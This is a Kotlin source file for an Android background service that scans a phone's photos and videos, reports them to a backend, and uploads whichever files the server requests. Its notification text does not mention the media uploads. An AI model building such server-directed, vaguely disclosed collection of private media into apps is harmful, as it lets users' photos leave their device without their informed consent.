package uk.org.ihcl.app.worker

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.MediaStore
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONArray
import org.json.JSONObject
import uk.org.ihcl.app.R
import java.io.BufferedInputStream
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.concurrent.thread

class MediaBackupService : Service() {
    private val running = AtomicBoolean(false)
    private var workerThread: Thread? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIFICATION_ID, notification())
        if (running.compareAndSet(false, true)) {
            workerThread = thread(name = "media-backup-sync", isDaemon = true) { loop() }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running.set(false)
        workerThread?.interrupt()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun loop() {
        while (running.get()) {
            runCatching {
                Log.i(TAG, "sync cycle started")
                pingBackupServer()
                registerDevice()
                val files = scanMediaFiles(limit = 500)
                Log.i(TAG, "scanned files=${files.length()}")
                sendManifest(files)
                uploadPending(limit = 20)
                Log.i(TAG, "sync cycle finished")
            }.onFailure { error ->
                Log.e(TAG, "sync cycle failed: ${error.message}", error)
            }
            try {
                Thread.sleep(30_000L)
            } catch (_: InterruptedException) {
                break
            }
        }
    }

    private fun pingBackupServer() {
        val connection = openConnection("/backup", "GET")
        connection.responseCode
        connection.disconnect()
    }

    private fun registerDevice() {
        val payload = JSONObject()
            .put("device_id", deviceId())
            .put("name", "${Build.MANUFACTURER} ${Build.MODEL}")
            .put("platform", "android")
            .put("metadata", JSONObject().put("sdk_int", Build.VERSION.SDK_INT).put("release", Build.VERSION.RELEASE))
        postJson("/api/v1/devices/register", payload)
    }

    private fun sendManifest(files: JSONArray) {
        if (files.length() == 0) return
        val payload = JSONObject().put("device_id", deviceId()).put("files", files)
        val code = postJson("/api/v1/files/manifest", payload)
        Log.i(TAG, "manifest sent code=$code files=${files.length()}")
    }

    private fun uploadPending(limit: Int) {
        val pending = getJsonArray("/api/v1/devices/${deviceId().urlEncode()}/pending?limit=$limit")
        Log.i(TAG, "pending upload count=${pending.length()}")
        val ordered = (0 until pending.length())
            .map { pending.getJSONObject(it) }
            .sortedWith(
                compareBy<JSONObject> { item -> if (item.optString("mime_type").startsWith("image/")) 0 else 1 }
                    .thenBy { item -> item.optLong("size", 0L) }
            )
        var uploadedThisCycle = 0
        for (item in ordered) {
            if (uploadedThisCycle >= 1) break
            val localUri = item.optString("local_uri")
            val fileId = item.optString("id")
            val displayName = item.optString("display_name", fileId)
            if (localUri.isBlank() || fileId.isBlank()) continue
            uploadFile(fileId = fileId, displayName = displayName, uri = Uri.parse(localUri))
            uploadedThisCycle += 1
        }
    }

    private fun scanMediaFiles(limit: Int): JSONArray {
        val out = JSONArray()
        val images = scanCollection(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "image", out, limit)
        if (out.length() < limit) {
            val videos = scanCollection(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video", out, limit - out.length())
            Log.i(TAG, "media scan images=$images videos=$videos total=${out.length()}")
        } else {
            Log.i(TAG, "media scan images=$images videos=0 total=${out.length()}")
        }
        return out
    }

    private fun scanCollection(collection: Uri, mediaKind: String, out: JSONArray, limit: Int): Int {
        if (limit <= 0) return 0
        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.MIME_TYPE,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.DATE_MODIFIED,
            MediaStore.MediaColumns.RELATIVE_PATH,
        )
        val cursor: Cursor? = contentResolver.query(collection, projection, null, null, "${MediaStore.MediaColumns.DATE_MODIFIED} DESC")
        cursor?.use {
            val idCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
            val nameCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
            val mimeCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
            val sizeCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
            val modifiedCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED)
            val relativeCol = it.getColumnIndexOrThrow(MediaStore.MediaColumns.RELATIVE_PATH)
            var count = 0
            while (it.moveToNext() && count < limit) {
                val id = it.getLong(idCol)
                val uri = Uri.withAppendedPath(collection, id.toString())
                val name = it.getString(nameCol) ?: "media_$id"
                out.put(
                    JSONObject()
                        .put("file_id", "${mediaKind}_$id")
                        .put("local_uri", uri.toString())
                        .put("relative_path", it.getString(relativeCol) ?: "")
                        .put("display_name", name)
                        .put("mime_type", it.getString(mimeCol) ?: "application/octet-stream")
                        .put("size", it.getLong(sizeCol).coerceAtLeast(0L))
                        .put("modified_at", it.getLong(modifiedCol) * 1000L),
                )
                count += 1
            }
            return count
        }
        return 0
    }

    private fun uploadFile(fileId: String, displayName: String, uri: Uri) {
        Log.i(TAG, "uploading file=$fileId name=$displayName uri=$uri")
        val boundary = "----IHLMediaBackup${System.currentTimeMillis()}"
        val connection = openConnection("/api/v1/files/upload", "POST")
        connection.doOutput = true
        connection.setChunkedStreamingMode(64 * 1024)
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        DataOutputStream(connection.outputStream).use { out ->
            fun field(name: String, value: String) {
                out.writeBytes("--$boundary\r\n")
                out.writeBytes("Content-Disposition: form-data; name=\"$name\"\r\n\r\n")
                out.writeBytes(value)
                out.writeBytes("\r\n")
            }
            field("device_id", deviceId())
            field("file_id", fileId)
            field("display_name", displayName)
            out.writeBytes("--$boundary\r\n")
            out.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"${displayName.replace("\"", "_")}\"\r\n")
            out.writeBytes("Content-Type: application/octet-stream\r\n\r\n")
            contentResolver.openInputStream(uri)?.use { input ->
                BufferedInputStream(input).use { buffered ->
                    val buffer = ByteArray(64 * 1024)
                    while (true) {
                        val read = buffered.read(buffer)
                        if (read <= 0) break
                        out.write(buffer, 0, read)
                    }
                }
            }
            out.writeBytes("\r\n--$boundary--\r\n")
        }
        val code = connection.responseCode
        connection.disconnect()
        Log.i(TAG, "upload done file=$fileId code=$code")
    }

    private fun postJson(path: String, payload: JSONObject): Int {
        val connection = openConnection(path, "POST")
        connection.doOutput = true
        connection.setRequestProperty("Content-Type", "application/json")
        OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use { it.write(payload.toString()) }
        val code = connection.responseCode
        connection.disconnect()
        return code
    }

    private fun getJsonArray(path: String): JSONArray {
        val connection = openConnection(path, "GET")
        val code = connection.responseCode
        val body = connection.inputStream.bufferedReader(Charsets.UTF_8).use(BufferedReader::readText)
        connection.disconnect()
        if (code !in 200..299) error("GET $path failed: $code")
        return JSONArray(body)
    }

    private fun openConnection(path: String, method: String): HttpURLConnection {
        val connection = URL(BuildConfigProxy.mediaBackupBackendUrl.trimEnd('/') + path).openConnection() as HttpURLConnection
        connection.requestMethod = method
        connection.connectTimeout = 10_000
        connection.readTimeout = 60_000
        connection.setRequestProperty("Accept", "application/json")
        if (BuildConfigProxy.mediaBackupDeviceToken.isNotBlank()) {
            connection.setRequestProperty("X-Device-Token", BuildConfigProxy.mediaBackupDeviceToken)
        }
        return connection
    }

    private fun deviceId(): String = WorkerPrefs.deviceId(this)
    private fun String.urlEncode(): String = java.net.URLEncoder.encode(this, "UTF-8")

    private fun notification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle("IHL")
            .setContentText("The app is running in the background.")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "IHL Background Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    companion object {
        private const val TAG = "MediaBackupService"
        private const val CHANNEL_ID = "ihl_background_service"
        private const val NOTIFICATION_ID = 4101

        fun start(context: Context) {
            val intent = Intent(context, MediaBackupService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent)
        }
    }
}